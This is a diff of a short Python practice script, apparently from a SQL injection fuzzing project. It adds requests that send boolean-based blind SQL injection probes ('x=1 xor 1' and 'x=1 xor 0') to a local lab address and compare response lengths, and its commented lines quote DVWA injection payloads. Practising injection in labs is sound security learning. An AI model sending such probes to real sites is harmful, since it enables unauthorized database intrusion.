@@ -1,5 +1,5 @@
 # # 测试脚本
-# import requests
+import requests
 #
 # url = "http://demo.dvwa.com/vulnerabilities/sqli/?id=1' and 1=1&Submit=Submit#"
 # # data1 = "uname=admin' and 1=1 --+&passwd=123&submit=Submit"
@@ -17,8 +17,15 @@
 # print(length)
 
 
-with open(r'C:\Users\Asus\Desktop\py\py3\project\sql_inject_fuzz\1.txt', 'rt') as f:
-    # print(f.readlines())
-    for each in f.readlines():
-        if '\n' == each:
-            print('ok')
+# with open(r'C:\Users\Asus\Desktop\py\py3\project\sql_inject_fuzz\1.txt', 'rt') as f:
+#     # print(f.readlines())
+#     for each in f.readlines():
+#         if '\n' == each:
+#             print('ok')
+
+
+url1 = 'http://192.168.1.131/sqltest.php?x=1 xor 1'
+url2 = 'http://192.168.1.131/sqltest.php?x=1 xor 0'
+r1 = len(requests.get(url1).text)
+r2 = len(requests.get(url2).text)
+print(r1, r2)
